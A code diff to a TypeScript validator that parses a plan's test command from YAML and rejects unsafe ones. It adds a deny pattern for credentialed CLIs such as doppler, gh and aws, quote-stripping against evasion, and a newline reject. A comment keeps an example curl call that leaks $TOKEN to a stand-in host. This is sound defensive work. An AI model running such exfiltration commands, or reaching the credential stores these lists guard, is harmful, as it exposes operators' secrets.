@@ -96,12 +96,38 @@ const SSH_REJECT_RE = /(^|[^A-Za-z0-9_.-])ssh([^A-Za-z0-9_.-]|$)/;
 // Rejected: $( , backtick, <( , >( , ; , && , || , & , $VAR / ${VAR}.
 const RUNLOG_SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||&|\$\{?[A-Za-z_])/;
 
+// Credentialed CLIs — mirrors SKILL.md Step 10.4. Check 10 runs `$CMD` with the
+// operator's ambient FILE-BACKED CLI auth reachable: `env -i` scrubs env vars
+// but preserves $HOME, so e.g. the Doppler CLI still reads a live `dp.ct.*`
+// token from its on-disk config under ~/.doppler/.
+//
+// This is the load-bearing control for the #6772 folded-scalar fix, which is a
+// fail-open transition — commands that used to parse to the literal `>` and
+// self-reject now reach execution. A folded scalar joins with a SPACE and so
+// carries no shell-active token by construction; SUBST_REJECT_RE therefore
+// covers none of that class. Only this verb reject does.
+//
+// The `/` in the leading class catches `/usr/local/bin/gh`; the trailing
+// boundary keeps `curl https://app.soleur.ai/highlights` runnable.
+const CRED_REJECT_RE =
+  /(^|[\t\n\r \f\v/])(doppler|gh|aws|supabase|stripe|hcloud|wrangler|terraform|flyctl|vercel)([\t\n\r \f\v]|$)/;
+
+// Bash resolves `"doppler"`, `\doppler` and `dopp""ler` to the same binary, but the
+// word-boundary anchors above cannot see through the quote characters. Strip them
+// from a COPY before matching — mirrors the `CMD_DEQ` substitution in SKILL.md
+// Step 10.4. Never strip from the string that would be executed.
+const dequote = (cmd: string): string => cmd.replace(/["'\\]/g, "");
+
 // Shell-active tokens that route command output / chain commands / spawn
 // subshells / expand vars. The plan author is trust-on-PR-review but the env
 // scrub in SKILL.md Step 10.5 is the load-bearing mitigation — this regex
 // is defense-in-depth. Note: `$` (parameter expansion) IS rejected to block
 // `curl https://api.example.com/?leak=$TOKEN` even with env scrub.
-const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\$\{?[A-Za-z_])/;
+//
+// `\n` closes BLOCK-mode chaining only: a block scalar joins with newlines,
+// which `bash -c` runs as separate statements. It contributes zero coverage to
+// folded scalars — see CRED_REJECT_RE above.
+const SUBST_REJECT_RE = /(\$\(|`|<\(|>\(|;|&&|\|\||\||>|<|&|\n|\$\{?[A-Za-z_])/;
 
 // Return the body of EVERY `## Observability` section (each: lines after the
 // heading up to the next `^## ` heading). A doc may carry several such sections
@@ -161,32 +187,65 @@ function extractBlocksMatching(planBody: string, headingRe: RegExp): string[] {
   return blocks;
 }
 
+// Horizontal whitespace, POSIX [[:space:]] minus \n (lines are already split)
+// and minus \r (stripped by the split — the documented CRLF divergence from awk).
+// Deliberately NOT `\s`, which matches Unicode whitespace bash does not.
+const H = "[ \\t\\f\\v]";
+const FOLD_HEADER_RE = new RegExp(`^${H}*command:${H}*>[-+]?${H}*(#.*)?$`);
+const BLOCK_HEADER_RE = new RegExp(`^${H}*command:${H}*\\|[-+]?${H}*(#.*)?$`);
+const INLINE_KEY_RE = new RegExp(`^${H}*command:${H}*(\\S.*)$`);
+const BLANK_RE = new RegExp(`^${H}*$`);
+
+const indentOf = (line: string): number =>
+  (new RegExp(`^${H}*`).exec(line)?.[0] ?? "").length;
+
 export function parseCommand(observabilityBlock: string): string {
   const lines = observabilityBlock.split(/\r?\n/);
 
   // Form A — strict YAML key (strongest signal).
-  let inBlockScalar = false;
-  const blockScalarLines: string[] = [];
+  //
+  // Mirrors plugins/soleur/skills/preflight/scripts/parse-form-a.awk. That file
+  // is authoritative; if these drift, the awk wins and this is the bug.
+  //
+  // Scalar extent follows YAML indent semantics: a continuation is a non-empty
+  // line indented MORE than the `command:` key, and the first line indented <=
+  // the key ends the scalar. No key-name matching — a key regex both truncates
+  // legitimate content (a jq object filter's `host_present:`) and leaves a
+  // differential where a LESS-indented non-key line is consumed anyway, which a
+  // PR reviewer reads as outside the command but the shell executes.
+  let mode: "fold" | "block" | null = null;
+  let keyIndent = 0;
+  const scalarLines: string[] = [];
   for (const line of lines) {
-    if (inBlockScalar) {
-      if (/^\s*$/.test(line)) {
-        blockScalarLines.push("");
+    if (mode === null) {
+      // Fold/block headers MUST be tested before the inline rule: the inline
+      // pattern also matches `command: >-` and would return the literal
+      // indicator, which then self-rejects as a shell-active token (#6772).
+      if (FOLD_HEADER_RE.test(line)) {
+        mode = "fold";
+        keyIndent = indentOf(line);
         continue;
       }
-      if (/^\s+\S/.test(line)) {
-        blockScalarLines.push(line.replace(/^\s+/, ""));
+      if (BLOCK_HEADER_RE.test(line)) {
+        mode = "block";
+        keyIndent = indentOf(line);
         continue;
       }
-      break;
-    }
-    if (/^\s*command:\s*\|\s*$/.test(line)) {
-      inBlockScalar = true;
+      const inlineKey = line.match(INLINE_KEY_RE);
+      if (inlineKey) return stripQuotes(inlineKey[1].trim());
       continue;
     }
-    const inlineKey = line.match(/^\s*command:\s+(\S.*)$/);
-    if (inlineKey) return stripQuotes(inlineKey[1].trim());
+    // Blank lines are legal inside a scalar and carry no indentation, so this
+    // MUST precede the terminator or indentOf("") === 0 would end every scalar
+    // at its first blank line. The awk drops them; this mirrors that (it used
+    // to push "" and emit a spurious empty line).
+    if (BLANK_RE.test(line)) continue;
+    if (indentOf(line) <= keyIndent) break;
+    scalarLines.push(line.replace(new RegExp(`^${H}+`), ""));
   }
-  if (blockScalarLines.length > 0) return blockScalarLines.join("\n").trim();
+  if (scalarLines.length > 0) {
+    return scalarLines.join(mode === "fold" ? " " : "\n");
+  }
 
   // Form B — prose `discoverability_test` marker + first fenced code block.
   let sawMarker = false;
@@ -273,8 +332,21 @@ export function sshRejectReason(cmd: string): string | null {
  *
  * The message string is operator-facing and is asserted verbatim downstream —
  * it enumerates every rejected token. Do not reword it.
+ *
+ * Also carries the CREDENTIALED-CLI reject, which arrived on main as part of the
+ * fused `rejectReason` this function was split out of. It belongs HERE, not in
+ * `sshRejectReason`, for the same reason the token reject does: it is an
+ * execution property. Putting it on the unconditional path would break the
+ * feature's own canonical run-log shape — `gh` is in CRED_REJECT_RE and the
+ * documented run-log command is `gh run view <run-id> --log | grep MARKER`, so a
+ * run-log-applicable cred reject would refuse every correct run-log plan.
  */
 export function substRejectReason(cmd: string): string | null {
+  // Ordered to mirror the runtime: Step 10.4's verb rejects run before Step
+  // 10.5's shell-active-token reject.
+  if (CRED_REJECT_RE.test(dequote(cmd))) {
+    return "discoverability_test.command invokes a credentialed CLI; refusing to run. Check 10 executes with the operator's ambient file-backed CLI auth reachable (env -i does NOT scrub it — $HOME is preserved, so the Doppler CLI token, SSH private keys, netrc, git credentials, AWS credentials, the gcloud credentials database, and the Docker config are all readable). Use an unauthenticated probe, or see the Check-10 credentialed-probe design issue if this probe genuinely needs credentials.";
+  }
   if (SUBST_REJECT_RE.test(cmd)) {
     return "discoverability_test.command contains shell-active token (;, &&, ||, |, >, <, &, $var, $(, `, <(, >() — refusing to run. Plans must compose single-statement commands without chaining or substitution.";
   }
